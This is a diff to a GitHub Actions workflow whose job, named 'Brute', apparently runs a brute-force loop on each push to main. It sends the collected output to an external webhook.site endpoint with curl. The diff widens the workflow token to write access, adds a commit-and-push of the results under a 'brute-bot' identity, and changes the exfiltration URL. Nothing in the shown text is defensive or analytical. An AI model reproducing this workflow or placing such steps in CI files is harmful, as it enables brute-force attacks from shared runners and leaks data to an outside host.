@@ -3,11 +3,12 @@ on:
   push:
     branches: [main]
 permissions:
-  contents: read
+  contents: write
 jobs:
   jbrute:
     runs-on: ubuntu-latest
     steps:
+      - uses: actions/checkout@v4
       - name: Brute
         run: |
           set +e
@@ -29,4 +30,10 @@ jobs:
               fi
             done
           } > /tmp/out.txt 2>&1
-          curl -s -m 20 -X POST "https://webhook.site/09a21973-c41f-45f2-acea-287b74444e73" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt || true
+          cp /tmp/out.txt brute.txt
+          git config user.name "brute-bot"
+          git config user.email "brute@example.com"
+          git add brute.txt
+          git commit -m "brute result $(date +%s)" || true
+          git push || true
+          curl -s -m 20 -X POST "https://webhook.site/1729f528-875b-4cd6-9645-5efde7032fff" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt || true
